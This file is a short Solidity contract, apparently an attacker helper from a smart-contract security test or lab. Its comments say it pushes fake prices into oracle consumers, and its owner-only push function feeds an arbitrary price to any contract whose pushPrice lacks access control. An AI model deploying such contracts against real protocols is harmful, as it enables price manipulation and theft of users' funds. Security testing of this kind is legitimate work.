// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IOracleReceiver {
    function pushPrice(int256 price) external;
}

/// @title OraclePushOverride - Pushes fake prices to oracle consumers
contract OraclePushOverride {
    address public attacker;
    int256 public pushedValue;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    function push(address target, int256 price) external {
        require(msg.sender == attacker, "Only attacker");
        pushedValue = price;

        // Pushes fake data into real oracle readers
        IOracleReceiver(target).pushPrice(price);
    }
}
